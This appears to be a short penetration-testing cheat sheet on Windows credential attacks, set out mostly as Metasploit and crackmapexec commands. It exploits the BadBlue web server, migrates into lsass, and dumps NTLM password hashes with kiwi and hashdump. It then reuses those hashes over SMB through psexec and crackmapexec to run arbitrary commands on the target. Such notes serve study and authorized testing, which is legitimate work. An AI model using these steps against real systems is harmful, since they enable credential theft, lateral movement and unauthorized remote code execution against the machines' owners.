
Hole exploit depend on `smb` 

Use `Metasploit` for exploit and still a hash (LM/NTLM)
```
service postgresql start && msfconsole -q

search badblue

use exploit/windows/http/badblue_passthru

set rhosts <target_ip>

exploit



pgrep lsass

migrate <PID/Process_Name>

getuid  #For check user priviledge

load kiwi  #For dump password hash (NTLM)

lsa_dump_sam

hashdump #Another way of dump the hash

CTRL ^ Z  #For make it background
```

```
search psexec

use exploit/windows/smb/psexec

set rhosts <target_ip>

set lport <user_diffrent_port>

set SMBUser <username>

set SMBPass <password/hash> #user both (LM:NTLM)

run

--------------------------------
If fail any how:-


set target Native\ upload

run
```




#### Another Method:

Use `crackmapexec` for do the same thing

Authentication using hash or password 
```
crackmapexec smb <target_ip> -u Administrator -H "<NTLM hash>"

crackmapexec smb <target_ip> -u Administrator -p "<password>"
```

Execute command after auth
```
crackmapexec smb <target_ip> -u Administrator -H "<password>" -x "<command>"
```